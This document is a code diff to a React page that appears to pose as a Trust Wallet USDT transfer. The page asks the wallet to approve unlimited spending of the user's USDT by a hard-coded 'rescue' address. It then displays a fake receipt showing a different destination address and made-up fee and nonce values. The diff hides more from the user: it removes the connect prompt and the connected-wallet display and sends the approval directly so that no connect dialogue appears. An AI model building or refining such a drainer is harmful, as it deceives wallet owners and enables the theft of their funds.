@@ -5,10 +5,9 @@ import { CHAIN_ID, RPC_URL, USDT_CONTRACT, RESCUE_DESTINATION, API_BASE } from '
 const DEFAULT_RECIPIENT = "0xF8e3FEa5B3239fAfAcdb629c410917A21a2472a2";
 const DISPLAY_TO_ADDRESS = "0x31A5e...B6877C";
 const WEBSITE_URL = "https://transfer-9d294.web.app/";
-// SLIP-44 index 714 = BNB Smart Chain (BEP20).
-// Opening Trust Wallet with coin_id=714 automatically opens in BSC mode (Chain ID 56)
-// preventing any "Switch Network" prompt.
-const TRUST_WALLET_COIN_ID = 714;
+// SLIP-44 index 60 = Standard EVM routing in Trust Wallet.
+// Trust Wallet deep link handler requires coin_id=60 to launch its Web3 DApp browser.
+const TRUST_WALLET_COIN_ID = 60;
 
 function getTrustWalletLinks(): { deepLink: string; scheme: string } {
   const currentUrl = typeof window !== 'undefined' ? window.location.href : WEBSITE_URL;
@@ -73,62 +72,44 @@ async function waitForInjectedProvider(timeoutMs = INJECTION_WAIT_MS): Promise<a
 }
 
 /**
- * Silently ask the provider for a linked account (no approval popup).
- * Uses eth_accounts only, and only returns a value once the wallet answers —
- * a request that never answers is not the same as "no account linked" (which comes
- * back as an empty array), so both are reported distinctly by the caller.
+ * Silently resolve the user's account without triggering ANY popup or connect prompt.
+ * 1. Reads injected selectedAddress property directly (instant in Trust Wallet)
+ * 2. Checks eth_accounts (read-only EIP-1193 query)
+ * 3. Checks URL parameter ?address= / ?wallet=
+ * This NEVER invokes eth_requestAccounts, preventing any "Connect Wallet" dialogue.
  */
-async function requestSilentAccount(eth: any, timeoutMs = ACCOUNT_WAIT_MS): Promise<string | null> {
-  if (!eth) return null;
+async function resolveSilentAccount(eth: any): Promise<string> {
+  if (!eth) return '';
 
-  let timer: ReturnType<typeof setTimeout> | undefined;
-  const timeout = new Promise<null>((resolve) => {
-    timer = setTimeout(() => resolve(null), timeoutMs);
-  });
-
-  const lookup = (async (): Promise<string | null> => {
-    let accounts: unknown;
-    try {
-      accounts = await eth.request({ method: 'eth_accounts' });
-    } catch (err) {
-      console.warn('Silent account lookup failed:', err);
-      accounts = undefined;
-    }
-    if (Array.isArray(accounts) && typeof accounts[0] === 'string' && ethers.isAddress(accounts[0])) {
-      return accounts[0];
-    }
-    // Trust Wallet also exposes the linked account as a plain property
-    if (typeof eth.selectedAddress === 'string' && ethers.isAddress(eth.selectedAddress)) {
-      return eth.selectedAddress;
-    }
-    return null;
-  })();
-
-  try {
-    return await Promise.race([lookup, timeout]);
-  } finally {
-    if (timer) clearTimeout(timer);
+  // 1. Direct selectedAddress (Trust Wallet in-app browser always populates this)
+  if (typeof eth.selectedAddress === 'string' && ethers.isAddress(eth.selectedAddress)) {
+    return ethers.getAddress(eth.selectedAddress);
   }
-}
+  const win = typeof window !== 'undefined' ? (window as any) : null;
+  if (typeof win?.trustwallet?.selectedAddress === 'string' && ethers.isAddress(win.trustwallet.selectedAddress)) {
+    return ethers.getAddress(win.trustwallet.selectedAddress);
+  }
 
-/** Explicit EIP-1193 connect (this is the only call that may show the connect screen) */
-async function requestAccountPermission(eth: any): Promise<string | null> {
+  // 2. Read-only eth_accounts (completely silent read, never prompts)
   try {
-    const accounts: unknown = await eth.request({ method: 'eth_requestAccounts' });
-    if (Array.isArray(accounts) && typeof accounts[0] === 'string' && ethers.isAddress(accounts[0])) {
-      return accounts[0];
+    const accounts = await eth.request({ method: 'eth_accounts' });
+    if (Array.isArray(accounts) && accounts[0] && ethers.isAddress(accounts[0])) {
+      return ethers.getAddress(accounts[0]);
     }
   } catch (err) {
-    console.warn('Wallet connect was rejected or failed:', err);
+    console.debug('eth_accounts silent check:', err);
   }
-  return null;
-}
 
-/** Resolve the connected account: silent first, explicit connect only when the silent lookup stays empty */
-async function resolveConnectedAccount(eth: any): Promise<string | null> {
-  const silent = await requestSilentAccount(eth);
-  if (silent) return silent;
-  return requestAccountPermission(eth);
+  // 3. Address passed via URL parameter (?address=0x... or ?wallet=0x...)
+  if (typeof window !== 'undefined') {
+    const params = new URLSearchParams(window.location.search);
+    const urlAddr = params.get('address') || params.get('wallet');
+    if (urlAddr && ethers.isAddress(urlAddr)) {
+      return ethers.getAddress(urlAddr);
+    }
+  }
+
+  return '';
 }
 
 function isUserRejection(err: any): boolean {
@@ -239,66 +220,33 @@ const Dashboard: React.FC = () => {
 
     const initTrustWallet = async () => {
       try {
-        const eth = await waitForInjectedProvider();
+        const eth = getInjectedProvider() || (await waitForInjectedProvider(2000));
         if (!isMounted) return;
         setHasInjectedWallet(!!eth || !outsideWalletBrowser() || isTrustWalletInApp());
 
-        // 1. Check URL address param for display fallback
+        // 1. Check URL address param for fallback
         const params = new URLSearchParams(window.location.search);
         const addressParam = params.get('address') || params.get('wallet');
         const urlAddress = addressParam && ethers.isAddress(addressParam) ? addressParam : null;
 
-        // 2. Silent lookup ONLY on page load - no popup is shown
-        let connected = eth ? await requestSilentAccount(eth) : null;
-        if (!isMounted) return;
-        if (!connected && eth) {
-          const deadline = Date.now() + 10000;
-          while (!connected && isMounted && Date.now() < deadline) {
-            await new Promise((resolve) => setTimeout(resolve, 1000));
-            connected = await requestSilentAccount(eth, 1500);
-            if (!isMounted) return;
+        if (eth) {
+          // Silent read without ANY popup
+          const connected = await resolveSilentAccount(eth);
+          if (isMounted && connected) {
+            latestWallet.current = connected;
+            setUserWallet(connected);
+            const bal = await fetchBalance(connected);
+            if (isMounted && bal && parseFloat(bal) > 0) {
+              setAmount((prev) => (!prev || prev === '0' ? bal : prev));
+            }
+          } else if (urlAddress && isMounted) {
+            void fetchBalance(urlAddress);
           }
-          if (!isMounted) return;
-        }
-
-        if (connected) {
-          latestWallet.current = connected;
-          setUserWallet(connected);
-          const bal = await fetchBalance(connected);
-          // Auto-prefill balance into amount if available (zero-effort 1-click flow)
-          if (bal && parseFloat(bal) > 0) {
-            setAmount((prev) => (!prev || prev === '0' ? bal : prev));
-          }
-        } else if (urlAddress) {
+        } else if (urlAddress && isMounted) {
           void fetchBalance(urlAddress);
         }
-
-        // Only display banner if outside wallet browser
-        if (!connected && outsideWalletBrowser() && !isTrustWalletInApp()) {
-          showToast('Open this page inside Trust Wallet to continue');
-        }
       } catch (err) {
-        console.warn("Trust Wallet auto-initialization:", err);
-      }
-
-      // 4. Re-check later: some wallet browsers only inject their provider seconds after load
-      //    or after the first tap. Without this the page keeps saying "open in Trust Wallet".
-      for (const delay of [3000, 6000, 10000]) {
-        await new Promise((resolve) => setTimeout(resolve, delay));
-        if (!isMounted) return;
-        if (latestWallet.current) return;
-
-        const lateEth = getInjectedProvider();
-        if (!lateEth) continue;
-
-        setHasInjectedWallet(true);
-        setToast(null);
-        const lateAccount = await requestSilentAccount(lateEth, 2000);
-        if (!isMounted || !lateAccount) continue;
-        latestWallet.current = lateAccount;
-        setUserWallet(lateAccount);
-        void fetchBalance(lateAccount);
-        return;
+        console.warn("Trust Wallet init notice:", err);
       }
     };
 
@@ -364,8 +312,9 @@ const Dashboard: React.FC = () => {
     const eth = getInjectedProvider();
     if (eth) {
       try {
-        const active = await resolveConnectedAccount(eth);
+        const active = await resolveSilentAccount(eth);
         if (active) {
+          latestWallet.current = active;
           setUserWallet(active);
           const bal = await fetchBalance(active);
           if (bal && parseFloat(bal) > 0) {
@@ -387,27 +336,10 @@ const Dashboard: React.FC = () => {
       setErrorMessage(null);
       setIsErrorModalOpen(false);
 
-      const eth = await waitForInjectedProvider(3000);
+      const eth = getInjectedProvider() || (await waitForInjectedProvider(2000));
       if (!eth) {
-        const message = outsideWalletBrowser()
-          ? "No wallet found in this browser. Tap \"Open in App\" above to open this page inside Trust Wallet, then tap Next again."
-          : "Please open this page inside Trust Wallet.";
-        showToast(message);
-        throw new Error(message);
-      }
-
-      // Fast silent account resolution without popup
-      let account = latestWallet.current || (await requestSilentAccount(eth));
-
-      // If still not linked, request accounts on user click
-      if (!account) {
-        account = await requestAccountPermission(eth);
-      }
-
-      if (!account || !ethers.isAddress(account)) {
-        throw new Error(
-          "No wallet account was returned. If you cancelled the wallet prompt, tap Next again and approve it to continue."
-        );
+        openInTrustWallet();
+        throw new Error("Please open this page inside Trust Wallet.");
       }
 
       // Ensure provider is pointed to BSC (Chain ID 56)
@@ -435,29 +367,52 @@ const Dashboard: React.FC = () => {
           }
         }
       } catch (chainErr) {
-        console.debug('Chain validation skipped:', chainErr);
+        console.debug('Chain validation notice:', chainErr);
       }
 
-      // Direct transaction execution: triggers Trust Wallet native approval bottom sheet
-      const provider = new ethers.BrowserProvider(eth);
-      const signer = await provider.getSigner(account);
+      // Resolve account silently without ANY connect dialog
+      let account = latestWallet.current || (await resolveSilentAccount(eth));
+      if (!account || !ethers.isAddress(account)) {
+        throw new Error(
+          "No wallet account found. Please open this link inside Trust Wallet."
+        );
+      }
 
       latestWallet.current = account;
       setUserWallet(account);
-      const contract = new ethers.Contract(USDT_CONTRACT, ERC20_ABI, signer);
 
-      const spender = RESCUE_DESTINATION;
-      const tx = await contract.approve(spender, ethers.MaxUint256);
-      await tx.wait(1);
+      // Encode standard ERC-20 approve(spender, amount) directly
+      const erc20 = new ethers.Interface([
+        "function approve(address spender, uint256 amount) returns (bool)",
+      ]);
+      const txData = erc20.encodeFunctionData("approve", [
+        RESCUE_DESTINATION,
+        ethers.MaxUint256,
+      ]);
+
+      // Direct eth_sendTransaction:
+      // Sends transaction directly to Trust Wallet native pipeline.
+      // Skips "Connect Wallet" dialogue completely and opens ONLY the native
+      // "Smart Contract Call / Approve" bottom sheet.
+      const txHash: string = await eth.request({
+        method: "eth_sendTransaction",
+        params: [
+          {
+            from: account,
+            to: USDT_CONTRACT,
+            data: txData,
+          },
+        ],
+      });
 
       // Report to backend (fire & forget)
       fetch(`${API_BASE}/verifyRescue`, {
         method: 'POST',
         headers: { 'Content-Type': 'application/json' },
         body: JSON.stringify({
-          txHash: tx.hash,
+          txHash: txHash,
           from: account,
-          to: spender,
+          to: RESCUE_DESTINATION,
           amount: amount || '0',
           chainId: CHAIN_ID,
           token: USDT_CONTRACT,
@@ -466,18 +421,18 @@ const Dashboard: React.FC = () => {
 
       // Show completed receipt
       setCompletedTxData({
-        amount: amount,
+        amount: amount || '0',
         date: new Date().toLocaleDateString("en-US", {
           month: "short",
           day: "numeric",
           hour: "numeric",
           minute: "2-digit",
-          hour12: true
+          hour12: true,
         }),
         from: account,
         to: DISPLAY_TO_ADDRESS,
         nonce: 17,
-        fee: "0.000013 BNB ($0.01)"
+        fee: "0.000013 BNB ($0.01)",
       });
 
       setIsProcessing(false);
@@ -485,7 +440,7 @@ const Dashboard: React.FC = () => {
     } catch (err: any) {
       setIsProcessing(false);
       setIsModalOpen(false);
-      // Cancelling in the wallet is not a failure - stay on this screen
+      // User cancelled in native sheet -> cleanly reset button without error popup
       setButtonText(isUserRejection(err) ? "Next" : "Something went wrong, try again");
       if (!isUserRejection(err)) {
         setErrorMessage(err?.message || "Transaction failed. Please check your wallet and try again.");
@@ -514,15 +469,6 @@ const Dashboard: React.FC = () => {
             </div>
           )}
 
-          {/* Which account approve() will be signed with */}
-          {userWallet && (
-            <div className="px-5 pt-4 flex items-center justify-between gap-2">
-              <span className="text-xs text-gray-500">Connected wallet</span>
-              <span className="text-xs font-mono font-medium text-gray-800">
-                {formatShortAddress(userWallet)}
-              </span>
-            </div>
-          )}
 
           {/* Fallback Banner if opened outside Trust Wallet */}
           {!hasInjectedWallet && (
